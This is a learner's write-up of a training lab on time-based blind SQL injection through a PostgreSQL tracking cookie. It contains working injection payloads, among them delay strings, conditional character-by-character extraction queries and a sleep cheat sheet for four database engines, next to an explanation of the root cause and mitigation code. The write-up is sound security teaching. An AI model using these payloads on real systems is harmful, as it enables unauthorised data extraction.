# Lab 14: Blind SQL Injection with Time Delays

## Category
SQL Injection - Blind SQLi

## Vulnerability Summary
This lab demonstrates a **blind SQL injection** vulnerability where the application doesn't display database errors or query results directly. Instead, we need to infer information by observing the application's behavior — specifically, using time-based techniques to confirm the injection point.

## Attack Methodology

### Step 1: Initial Reconnaissance
Started by testing the `TrackingId` cookie for SQL injection vulnerabilities. This cookie is used to track user sessions and is likely being passed directly to a database query.

### Step 2: Detecting the Injection Point
Tried basic SQL injection payloads to see if the application responds differently:
```sql
' --
" --
'; SELECT pg_sleep(5)--
```

### Step 3: Time-Based Detection
Since this is a **PostgreSQL** backend (identified from previous labs and error patterns), used the `pg_sleep()` function to introduce delays:
```sql
SELECT pg_sleep(10)
```

### Step 4: The Struggle
Here's where I spent most of my time 😅

I kept trying different variations of the payload:
- `SELECT pg_sleep(10)` → Didn't work
- `'; SELECT pg_sleep(10)--` → Still nothing
- `'; SELECT pg_sleep(10);--` → Nope
- `" SELECT pg_sleep(10)--` → No luck

Tried combining with different quote types, semicolons, and comment styles. Nothing was triggering the time delay.

### Step 5: The Breakthrough
Finally checked the solution and realized the issue — the payload needed to be **injected into an existing string context** with proper concatenation:

```sql
' || pg_sleep(10)--
```

This works because:
- `'` closes the existing string in the query
- `||` is PostgreSQL's string concatenation operator
- `pg_sleep(10)` introduces the 10-second delay
- `--` comments out the rest of the query

### Step 6: Confirmation
Sent the request with the correct payload and waited... 10 seconds later, the response came back. **Lab solved!** 🎉

![Lab 14 Screenshot](screenshot.png)

## Technical Root Cause

### Why My Initial Payloads Failed
The application was constructing the query like this:
```sql
SELECT * FROM sessions WHERE tracking_id = '[USER_INPUT]'
```

When I tried `SELECT pg_sleep(10)--`, the actual query became:
```sql
SELECT * FROM sessions WHERE tracking_id = 'SELECT pg_sleep(10)--'
```
This is just a string comparison, not SQL execution.

### Why `|| pg_sleep(10)--` Worked
With the correct payload, the query became:
```sql
SELECT * FROM sessions WHERE tracking_id = '' || pg_sleep(10)--'
```
Which PostgreSQL interprets as:
1. Empty string `''`
2. Concatenate with `||`
3. Execute `pg_sleep(10)`
4. Comment out the trailing `'` with `--`

## Impact
- **Blind Data Extraction:** Can extract database contents one character at a time
- **Database Enumeration:** Can determine table names, column names, and user credentials
- **Time-Consuming but Effective:** Slow but reliable method to confirm and exploit SQLi
- **Hard to Detect:** No visible errors or unusual output in the response

## Proof of Concept

### Basic Time Delay Payload
```sql
' || pg_sleep(5)--
```

### Conditional Time Delay (for data extraction)
```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### Extracting Data Character by Character
```sql
' || (SELECT CASE WHEN (SUBSTRING(username,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)--
```

## My Key Takeaways

1. **Understand the Context:** Always figure out how your input is being used in the query before crafting payloads.

2. **Database-Specific Syntax Matters:** 
   - PostgreSQL uses `||` for concatenation
   - MySQL uses `CONCAT()` or `||` (with PIPES_AS_CONCAT mode)
   - SQL Server uses `+`

3. **Blind SQLi Requires Patience:** You won't see immediate results. Time-based attacks are slow but effective for confirmation.

4. **Don't Give Up Too Quickly:** I almost closed this tab thinking the lab was broken. Sometimes the solution is just a different syntax away.

5. **Learn the Common Patterns:**
   ```
   PostgreSQL: ' || pg_sleep(10)--
   MySQL: ' OR SLEEP(10)--
   SQL Server: '; WAITFOR DELAY '0:0:10'--
   Oracle: ' || DBMS_PIPE.RECEIVE_MESSAGE('x',10)--
   ```

## Mitigation

### 1. Parameterized Queries (Prepared Statements)
```java
// ❌ Bad - String concatenation
String query = "SELECT * FROM sessions WHERE tracking_id = '" + trackingId + "'";

// ✅ Good - Parameterized query
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM sessions WHERE tracking_id = ?");
stmt.setString(1, trackingId);
```

### 2. Input Validation
- Validate tracking IDs against expected format (e.g., alphanumeric only)
- Reject any input containing SQL keywords or special characters

### 3. Least Privilege
- Database user should have minimal permissions
- No access to system functions like `pg_sleep()`

### 4. Web Application Firewall (WAF)
- Block requests containing SQL keywords and functions
- Rate limit requests to slow down blind SQLi attempts

## References
- [PortSwigger Blind SQLi](https://portswigger.net/web-security/sql-injection/blind)
- [PostgreSQL Time-Based Functions](https://www.postgresql.org/docs/current/functions-datetime.html)
- [SQL Injection Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

> **Note:** Tried the payload `SELECT pg_sleep(10)` with different combinations until I saw the solution with `' || pg_sleep(10)--` and finally understood what the main problem was going on.

---
*Lab completed on: 2026-03-22*
